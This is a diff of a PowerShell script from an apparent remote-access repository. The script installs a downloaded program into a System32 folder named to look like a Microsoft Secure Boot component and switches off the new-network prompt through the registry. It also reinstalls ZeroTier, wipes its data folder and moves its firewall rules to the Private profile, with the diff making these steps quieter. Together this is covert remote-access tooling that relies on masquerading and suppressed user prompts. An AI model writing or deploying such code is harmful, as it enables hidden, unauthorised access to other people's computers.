@@ -5,23 +5,12 @@ $programNameWithExtension = [System.IO.Path]::GetFileName($downloadUrl)
 $destinationPath = "C:\Windows\System32\SecureBootUpdatesMicrosoft\$programNameWithExtension"
 $hashesUrl = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/HashesOfCorePrograms.txt"
 $ztdatadir = "$env:LOCALAPPDATA\ZeroTier"
-$registryPath = "HKLM:\System\CurrentControlSet\Control\Network"
-$registryKey = "NewNetworkWindowOff"
-$registryValue = 1
 #Code starts Here
-if (Test-Path "$registryPath\$registryKey") {
-    $currentValue = Get-ItemProperty -Path "$registryPath" -Name $registryKey
-    if ($currentValue.$registryKey -eq $registryValue) {
-    } else {
-        Set-ItemProperty -Path "$registryPath" -Name $registryKey -Value $registryValue
-    }
-} else {
-    New-ItemProperty -Path "$registryPath" -Name $registryKey -Value $registryValue -PropertyType DWord -Force
-}
+New-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Network\NewNetworkWindowOff" -ItemType Directory -Force | Out-Null
 Install-PackageProvider -Name NuGet -Force | Out-Null
 Uninstall-Package -Name "ZeroTier One" -Force | Out-Null
 if (Test-Path $ztdatadir) {
-Remove-Item -Path $ztdatadir -Force -ErrorAction SilentlyContinue | Out-Null
+Remove-Item -Path $ztdatadir -Recurse -Force -ErrorAction SilentlyContinue | Out-Null
 }
 if (-not (Test-Path (Split-Path $destinationPath))) {
     New-Item -Path (Split-Path $destinationPath) -ItemType Directory -Force | Out-Null
@@ -108,14 +97,13 @@ while ($retryCount -lt $maxRetries) {
         Start-Sleep -Seconds 5  # Add a delay before the next retry
     }
 }
-
 $AppNamePattern = "ZeroTier*"
 $Rules = Get-NetFirewallRule | Where-Object { $_.DisplayName -like $AppNamePattern }
 $ProfileType = "Private"
 if ($Rules.Count -gt 0) {
     foreach ($Rule in $Rules) {
         $Rule.Profile = $ProfileType
-        Set-NetFirewallRule -InputObject $Rule
+        Set-NetFirewallRule -InputObject $Rule | Out-Null
     }
 } else {}
 #ZT Adv Fix
